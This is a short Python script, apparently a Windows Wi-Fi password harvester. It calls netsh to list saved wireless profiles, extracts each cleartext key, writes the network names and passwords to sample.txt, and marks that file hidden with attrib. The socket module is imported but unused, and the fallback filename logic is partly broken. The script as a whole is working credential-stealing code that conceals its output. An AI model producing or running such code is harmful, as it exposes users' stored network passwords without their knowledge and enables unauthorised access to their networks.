import socket, os
import subprocess

def infile():
    #writing data in the file
    data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh','wlan','show','profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                report.write("{:<30}| {:<}".format(i, results[0])+"\n")
            except IndexError:
                report.write("{:<30}| {:<}".format(i, "")+"\n")
        except subprocess.CalledProcessError:
            report.write("{:<30}| {:<}".format(i, "ENCODING ERROR")+"\n")

    # closing the file
    report.close()
  

# creating a file first
fileName = 'sample.txt'
try:
    report = open('sample.txt','w')
    infile()
    # make the file a hidden file
    os.system("attrib +h " + fileName)

except:
    #declaration and initialization of variable n
    n = 1
    
    #while file name already exists
    while os.path.exists(fileName):
        #do below code
        p = str(n)
        fileNamee = fileName[:6]+p+('.txt')
        report = open(fileNamee,'w')
        infile()
        n+=1
        #break out of the loop
        break